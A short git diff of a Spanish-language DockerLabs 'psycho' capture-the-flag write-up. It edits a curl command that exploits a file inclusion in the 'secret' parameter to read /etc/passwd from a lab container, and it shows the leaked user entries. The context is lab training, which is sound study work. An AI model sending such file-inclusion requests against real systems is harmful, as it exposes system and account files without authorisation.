@@ -96,7 +96,7 @@ El parámetro vulnerable detectado es `secret`. Verifico la vulnerabilidad carga
 ![](assets/img/dockerlabs-writeup-psycho/psycho1_3.png)
 
 ```terminal
-/home/kali/Documents/dockerlabs/psycho:-$ curl http://127.17.0.2/index.php?secret=/etc/passwd | sed '/<body>/d; /<\/body>/d; /<head>/d; /<\/head>/d' | grep /bash$
+/home/kali/Documents/dockerlabs/psycho:-$ curl http://127.17.0.2/index.php?secret=/etc/passwd | grep /bash$
 root:x:0:0:root:/root:/bin/bash
 ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
 vaxei:x:1001:1001:,,,:/home/vaxei:/bin/bash
